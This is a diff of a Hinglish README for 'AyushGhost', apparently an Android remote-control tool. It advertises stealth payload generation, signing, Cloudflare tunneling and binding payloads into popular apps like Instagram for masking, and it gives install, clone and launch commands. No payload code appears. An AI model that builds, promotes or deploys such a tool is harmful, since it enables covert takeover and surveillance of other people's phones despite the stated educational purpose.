@@ -1,7 +1,9 @@
 # AyushGhost v9.0 (Ultra-Stealth Android Control)
 
 AyushGhost ek advance Python-based automated tool hai jo Android penetration testing aur educational security research ke liye banaya gaya hai. Ye tool automatic payload generation, stealth signing, aur Cloudflare tunneling provide karta hai.
-🚀 Features
+
+
+# 🚀 Features
 
  App Binder Mode: 50+ popular apps (Instagram, CapCut, etc.) ke saath masking.
 
@@ -23,8 +25,7 @@ Bash
     pkg install python python-pip git msfconsole cloudflared -y
 
 # Repository Clone Karein
-    git clone https://github.com/azadproduction212-cyber/AyushGhost.git
-
+    git clone https://github.com/AyushDevil-999/AyushGhost.git
 # Directory Mein Jayein
     cd AyushGhost
 
@@ -33,12 +34,11 @@ Bash
 
 
 
-Tool ko start karne ke liye ye command chalayein:
-Bash
+# Tool ko start karne ke liye ye command chalayein:
 
     python3 AyushGhost.py
 
- Execution Steps:
+ # Execution Steps:
 
  [01] Launch AyushGhost: Attack shuru karne ke liye option 1 select karein.
 
